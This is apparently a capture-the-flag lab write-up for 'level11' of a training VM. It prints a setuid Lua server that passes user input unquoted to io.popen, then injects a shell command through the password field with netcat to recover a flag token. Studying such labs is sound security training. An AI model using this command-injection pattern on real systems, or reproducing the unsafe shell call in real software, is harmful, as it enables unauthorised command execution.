# level11

## Steps

1. __Action__ (Guest): check the content of the `level11` user home directory once connected
	```sh
	ls -A
	```

2. __Observation__ (Guest): the previous command reveals 1 file possibly of interest,
	named `level11.lua`
	```
	.bash_logout  .bashrc  .profile  level11.lua
	```

3. __Action__ (Guest): check the permissions of the `level11.lua` file
	```sh
	getfacl level11.lua
	```

4. __Observation__ (Guest): the previous command reveals that the `level11.lua` file:
	- is owned by the `flag11` user
	- is readable by the `level11` user
	- has the `setuid` bit set
	```
	# file: level11.lua
	# owner: flag11
	# group: level11
	# flags: ss-
	user::rwx
	group::r-x
	other::r-x
	```

5. __Action__ (Guest): print the content of the `level11.lua` file
	```sh
	cat level11.lua
	```

6. __Observation__ (Guest): the previous command reveals that the `level11.lua` file
	contains a Lua script that listens on `localhost:5151` and asks for a password upon connection.
	Then the script hashes the provided password with a custom `hash` function, and compares
	the result with a hardcoded hash value. The interesting part is that the `hash` function
	invokes shell commands via the `io.popen` function, which is a security risk. And because
	it passes the user input directly to the shell, and unquoted, it is possible to inject
	shell commands.
	```lua
	#!/usr/bin/env lua

	local socket = require("socket")
	local server = assert(socket.bind("127.0.0.1", 5151))

	function hash(pass)
		prog = io.popen("echo "..pass.." | sha1sum", "r")
		data = prog:read("*all")
		prog:close()

		data = string.sub(data, 1, 40)

		return data
	end


	while 1 do
		local client = server:accept()
		client:send("Password: ")
		client:settimeout(60)

		local l, err = client:receive()
		if not err then
			print("trying " .. l)
			local h = hash(l)

			if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
				client:send("Erf nope..\n");
			else
				client:send("Gz you dumb*\n")
			end
		end
		client:close()
	end
	```

7. __Action__ (Guest): connect to localhost on port 5151 to make a shell command injection
	via a malicious password
	```sh
	echo '$( getflag | grep -oE "[^ ]+$" >/tmp/token )' | nc localhost 5151 >/dev/null
	```

8. __Action__ (Guest): check if the `token` file has been correctly created
	and contains the wanted token
	```sh
	cat /tmp/token || echo 'File does not exist'
	```

9. __Observation__ (Guest): the previous command reveals that the file has been created,
	and seems to contains the wanted token
	```
	fa6v5ateaw21peobuub8ipe6s
	```

10. __Action__ (Host): check if the token is correct by trying to connect as the `level12` user
	```sh
	sshpass -p fa6v5ateaw21peobuub8ipe6s 2>/dev/null \
		ssh -p 4242 level12@192.168.122.214 exit \
	&& echo 'Great! The token is correct!' \
	|| echo 'Nop, the token is incorrect!'
	```

11. __Observation__ (Host): the previous command reveals that the token is correct,
	by printing the following message on stdout:  
	`Great! The token is correct!`

12. __Action__ (Host): copy the `token` file from the virtual machine
	```sh
	sshpass -f level10/flag 2>/dev/null \
		scp -P 4242 level11@192.168.122.214:/tmp/token level11/flag
	```

13. __Action__ (Guest): remove the `token` file
	```sh
	rm /tmp/token
	```
